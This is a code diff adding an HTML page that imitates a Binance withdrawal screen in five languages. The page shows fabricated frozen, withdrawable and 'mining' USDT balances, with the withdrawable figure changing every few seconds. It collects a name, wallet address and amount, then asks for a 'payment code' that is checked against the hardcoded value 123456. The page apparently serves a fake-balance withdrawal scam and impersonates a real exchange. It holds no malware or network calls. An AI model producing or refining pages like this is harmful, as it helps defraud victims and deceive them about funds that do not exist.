@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html id="html" lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>سحب إلى Binance</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      margin: 0;
+      padding: 2mm;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #000; /* خلفية داكنة */
+    }
+
+    .video-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .content-wrapper {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      align-items: center;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-radius: 16px;
+      padding: 20px;
+      width: 100%;
+      max-width: 330px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      color: white;
+      text-align: center;
+    }
+
+    .balance {
+      font-size: 14px;
+      margin: 10px 0;
+      padding: 8px;
+      border-radius: 8px;
+      background-color: rgba(255,255,255,0.1);
+    }
+
+    .balance.green {
+      color: #28a745;
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .balance.red {
+      color: #dc3545;
+    }
+
+    .balance.blue {
+      color: #007bff;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      background-color: rgba(255, 255, 255, 0.8);
+      font-size: 14px;
+    }
+
+    .input-field.error {
+      border: 2px solid red;
+    }
+
+    .submit-button {
+      width: 100%;
+      padding: 10px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+
+    .submit-button:hover {
+      background-color: #218838;
+    }
+
+    .status {
+      margin-top: 10px;
+      font-weight: bold;
+      min-height: 24px;
+    }
+
+    #title {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 24px;
+    }
+
+    #logo {
+      width: 30px;
+      height: 30px;
+    }
+  </style>
+</head>
+<body>
+
+  <video autoplay muted loop class="video-bg">
+    <source src="background.mp4" type="video/mp4">
+  </video>
+
+  <div class="content-wrapper">
+    <div class="container">
+      <div class="balance red">الرصيد المجمد: 348.71 USDT</div>
+      <div class="balance green" id="changingBalance">الرصيد القابل للسحب: 9,628.06 USDT</div>
+      <div class="balance blue">الرصيد قيد التعدين: 13,311.44 USDT</div>
+    </div>
+
+    <div class="container">
+      <h2 id="title">
+        <img src="logo.png" alt="Binance Logo" id="logo" />
+        سحب إلى Binance
+      </h2>
+
+      <input type="text" class="input-field" id="fullName" placeholder="الاسم الكامل" />
+      <input type="text" class="input-field" id="wallet" placeholder="أدخل عنوان المحفظة" />
+      <input type="number" class="input-field" id="amount" placeholder="المبلغ (USDT)" />
+      <button class="submit-button" id="submitBtn" onclick="handleSubmit()">إرسال</button>
+      <input type="text" id="paymentCode" class="input-field" placeholder="أدخل رمز الدفع" style="display:none;" />
+      <div class="status" id="statusMsg"></div>
+    </div>
+  </div>
+
+  <script>
+    let language = localStorage.getItem("language") || 'ar';
+    document.documentElement.lang = language;
+    document.documentElement.dir = (language === 'ar' || language === 'ur') ? 'rtl' : 'ltr';
+
+    const texts = {
+      ar: {
+        title: "سحب إلى Binance",
+        walletPlaceholder: "أدخل عنوان المحفظة",
+        amountPlaceholder: "المبلغ (USDT)",
+        submit: "إرسال",
+        codePlaceholder: "أدخل رمز الدفع",
+        success: "تم إرسال طلب السحب بنجاح.",
+        error: "يرجى ملء جميع الحقول.",
+        maxError: "الحد الأقصى للسحب هو 9,628.06 USDT",
+        codeError: "رمز الدفع خاطئ. حاول مرة أخرى."
+      },
+      en: {
+        title: "Withdraw to Binance",
+        walletPlaceholder: "Enter wallet address",
+        amountPlaceholder: "Amount (USDT)",
+        submit: "Submit",
+        codePlaceholder: "Enter payment code",
+        success: "Withdrawal request sent successfully.",
+        error: "Please fill all fields.",
+        maxError: "The maximum withdrawal is 9,628.06 USDT",
+        codeError: "Incorrect payment code. Please try again."
+      },
+      fr: {
+        title: "Retrait vers Binance",
+        walletPlaceholder: "Entrez l'adresse du portefeuille",
+        amountPlaceholder: "Montant (USDT)",
+        submit: "Envoyer",
+        codePlaceholder: "Entrez le code de paiement",
+        success: "Demande de retrait envoyée avec succès.",
+        error: "Veuillez remplir tous les champs.",
+        maxError: "Le retrait maximal est de 9,628.06 USDT",
+        codeError: "Code de paiement incorrect. Essayez à nouveau."
+      },
+      zh: {
+        title: "提现到Binance",
+        walletPlaceholder: "输入钱包地址",
+        amountPlaceholder: "金额 (USDT)",
+        submit: "提交",
+        codePlaceholder: "输入支付验证码",
+        success: "提现请求已成功发送。",
+        error: "请填写所有字段。",
+        maxError: "最大提现金额为 9,628.06 USDT",
+        codeError: "支付验证码错误，请再试一次。"
+      },
+      ur: {
+        title: "Binance میں نکاسی",
+        walletPlaceholder: "والیٹ ایڈریس درج کریں",
+        amountPlaceholder: "رقم (USDT)",
+        submit: "ارسال کریں",
+        codePlaceholder: "ادائیگی کا کوڈ درج کریں",
+        success: "نکاسی کی درخواست کامیابی سے بھیج دی گئی۔",
+        error: "براہ کرم تمام فیلڈز پُر کریں۔",
+        maxError: "زیادہ سے زیادہ نکاسی 9,628.06 USDT ہے",
+        codeError: "ادائیگی کا کوڈ غلط ہے۔ دوبارہ کوشش کریں۔"
+      }
+    };
+
+    const t = texts[language] || texts["ar"];
+
+    // تطبيق الترجمات
+    document.getElementById("title").textContent = "";
+    const logo = document.createElement("img");
+    logo.src = "logo.png";
+    logo.alt = "Binance Logo";
+    logo.id = "logo";
+    document.getElementById("title").appendChild(logo);
+    document.getElementById("title").appendChild(document.createTextNode(" " + t.title));
+
+    document.getElementById("wallet").placeholder = t.walletPlaceholder;
+    document.getElementById("amount").placeholder = t.amountPlaceholder;
+    document.getElementById("submitBtn").textContent = t.submit;
+    const paymentCodeInput = document.getElementById("paymentCode");
+    paymentCodeInput.placeholder = t.codePlaceholder;
+
+    // تحديث الرصيد المتغير
+    const values = ["9,627.13", "9,626.91", "9,628.01", "9,629.01", "9,628.51"];
+    let i = 0;
+    setInterval(() => {
+      const balText = (language === "en") ? "Available balance" : "الرصيد القابل للسحب";
+      document.getElementById("changingBalance").textContent = `${balText}: ${values[i]} USDT`;
+      i = (i + 1) % values.length;
+    }, 3000);
+
+    const maxAmount = 9628.06;
+    const amountInput = document.getElementById("amount");
+    const statusMsg = document.getElementById("statusMsg");
+
+    amountInput.addEventListener("input", () => {
+      const value = parseFloat(amountInput.value);
+      if (value > maxAmount) {
+        statusMsg.textContent = t.maxError;
+        amountInput.classList.add("error");
+      } else {
+        statusMsg.textContent = "";
+        amountInput.classList.remove("error");
+      }
+    });
+
+    function handleSubmit() {
+      const fullName = document.getElementById("fullName").value.trim();
+      const wallet = document.getElementById("wallet").value.trim();
+      const amount = parseFloat(document.getElementById("amount").value.trim());
+
+      if (!fullName || !wallet || !amount || amount > maxAmount) {
+        statusMsg.textContent = t.error;
+        return;
+      }
+
+      document.getElementById("submitBtn").style.display = "none";
+      paymentCodeInput.style.display = "block";
+      paymentCodeInput.value = "";
+      paymentCodeInput.focus();
+      statusMsg.textContent = "";
+    }
+
+    paymentCodeInput.addEventListener("keyup", (e) => {
+      if (e.key === "Enter") {
+        verifyPaymentCode();
+      }
+    });
+
+    function verifyPaymentCode() {
+      const enteredCode = paymentCodeInput.value.trim();
+      const correctCode = "123456";
+
+      if (enteredCode === correctCode) {
+        statusMsg.style.color = "lightgreen";
+        statusMsg.textContent = t.success;
+        paymentCodeInput.classList.remove("error");
+        // إعادة تعيين النموذج أو أي إجراء بعد نجاح الإدخال
+        setTimeout(() => {
+          paymentCodeInput.style.display = "none";
+          document.getElementById("submitBtn").style.display = "block";
+          document.getElementById("fullName").value = "";
+          document.getElementById("wallet").value = "";
+          document.getElementById("amount").value = "";
+          statusMsg.textContent = "";
+          statusMsg.style.color = "white";
+        }, 3000);
+      } else {
+        statusMsg.style.color = "red";
+        statusMsg.textContent = t.codeError;
+        paymentCodeInput.classList.add("error");
+      }
+    }
+  </script>
+</body>
+</html>
